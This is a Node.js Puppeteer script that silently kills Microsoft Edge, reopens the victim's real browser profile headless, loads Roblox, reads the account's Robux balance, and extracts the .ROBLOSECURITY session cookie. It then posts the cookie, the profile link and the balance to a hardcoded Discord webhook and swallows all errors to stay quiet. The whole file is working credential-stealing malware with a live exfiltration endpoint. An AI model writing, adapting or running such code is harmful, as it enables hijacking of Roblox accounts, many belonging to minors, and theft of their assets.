const puppeteer = require('puppeteer');
const { execSync } = require('child_process');

// Kill any existing Edge processes so Puppeteer can open your real profile
try {
  execSync('taskkill /IM msedge.exe /F');
} catch (e) {
  // If no Edge was running, ignore
}

const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

(async () => {
  const edgeUserDataDir   = 'C:\\Users\\46736\\AppData\\Local\\Microsoft\\Edge\\User Data';
  const edgeExecutable    = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';
  const webhookURL        = 'https://discord.com/api/webhooks/1367835268954194072/d_xMvdDNjj16cU5TMPajZVf4OxMmz2SPmC5WWl_vvwrhP0bMxG37Ll2OPEUr-9d0JOa6';

  let browser;
  try {
    // Launch Puppeteer in headless mode and mute console logs
    browser = await puppeteer.launch({
      headless: true,  // Run without displaying the browser window
      executablePath: edgeExecutable,
      userDataDir: edgeUserDataDir,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],  // Security flags
    });

    const page = await browser.newPage();
    await page.goto('https://www.roblox.com', { waitUntil: 'networkidle2' });

    // Go straight to your profile
    await page.goto('https://www.roblox.com/users/profile', { waitUntil: 'networkidle2' });

    // Grab the profile URL
    const profileUrl = page.url();

    // Reveal Robux balance
    await page.click('#nav-robux');
    await page.waitForSelector('#nav-robux-amount', { timeout: 5000 });
    const robuxBalance = await page.$eval('#nav-robux-amount', el => el.innerText.trim());

    // Grab .ROBLOSECURITY cookie
    const client = await page.target().createCDPSession();
    const { cookies } = await client.send('Network.getAllCookies');
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
    if (!robloxCookie) throw new Error('.ROBLOSECURITY cookie not found');

    // Send the data to the Discord webhook
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content:
          `🔐 .ROBLOSECURITY:\n\`\`\`${robloxCookie.value}\`\`\`\n` +
          `👤 Profile: ${profileUrl}\n` +
          `💰 Robux: ${robuxBalance}`
      })
    });

  } catch (err) {
    // This will suppress error logs from Puppeteer or fetch failures
  } finally {
    if (browser) {
      await browser.close();
    }
  }
})();
